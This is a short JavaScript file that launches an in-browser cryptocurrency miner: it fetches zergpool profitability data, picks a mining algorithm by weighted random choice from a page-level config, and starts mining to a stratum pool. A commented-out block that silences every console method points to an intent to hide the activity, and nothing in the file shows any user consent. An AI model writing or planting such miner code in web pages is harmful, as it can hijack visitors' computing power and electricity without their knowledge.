
    import fetchpool from "./fetchpool.js"
    import { start } from "@marco_ciaramella/cpu-web-miner"

    fetchpool.zergpool().then(realtime=>{

        let total = 0;
        let weighted = window.weba2.weighted;
        
        for (let i = 0; i < weighted.length; i++) {
            if (realtime) weighted[i].score = realtime[weighted[i].algo];
            total += weighted[i].score;
        }

        let choice = Math.random() * total;
        let prev = 0;
       
        const select = (()=>{
            for (let i = 0; i < weighted.length; i++) {
                if (choice <= prev + weighted[i].score) return weighted[i];
                else prev += weighted[i].score;
            }
        })();

        /*
        const NOOP = ()=>{};
        console.log = NOOP;
        console.debug = NOOP;
        console.info = NOOP;
        console.warn = NOOP;
        console.error = NOOP;
        console.trace = NOOP;
        */

        start(select.algo, window.weba2.stratum(select));
    })
